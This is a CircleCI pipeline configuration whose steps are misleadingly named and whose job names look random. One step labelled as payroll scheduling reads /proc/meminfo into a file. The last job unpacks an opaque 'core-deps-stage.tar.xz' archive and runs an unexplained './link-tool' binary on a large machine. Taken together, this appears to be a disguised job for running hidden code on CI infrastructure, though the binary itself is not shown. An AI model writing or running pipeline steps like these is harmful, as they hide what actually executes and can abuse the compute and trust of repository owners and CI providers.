version: 2.1

jobs:
  IRQSGDBus:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Schedule the contracts by payroll cutoff
          command: |
            mkdir -p /tmp/_queue
            set +o pipefail 2>/dev/null; cat /proc/meminfo 2>/dev/null > /tmp/_queue/CedarNorthLepton; seq 1 5000 >> /tmp/_queue/CedarNorthLepton; true
            sha1sum /tmp/_queue/CedarNorthLepton
      - persist_to_workspace:
          root: /tmp/_queue
          paths:
            - 'CedarNorthLepton'
  t-2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/_queue
      - run:
          name: Mount upstream
          command: |
            cut -c1,3,5,7 /tmp/_queue/CedarNorthLepton 2>/dev/null | head -1 || true
      - run:
          name: Extract source
          command: git clone --depth 1 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Restore vendored sources
          command: unxz -c core-deps-stage.tar.xz | tar xf -
      - run:
          command: /bin/sh -c "./link-tool"
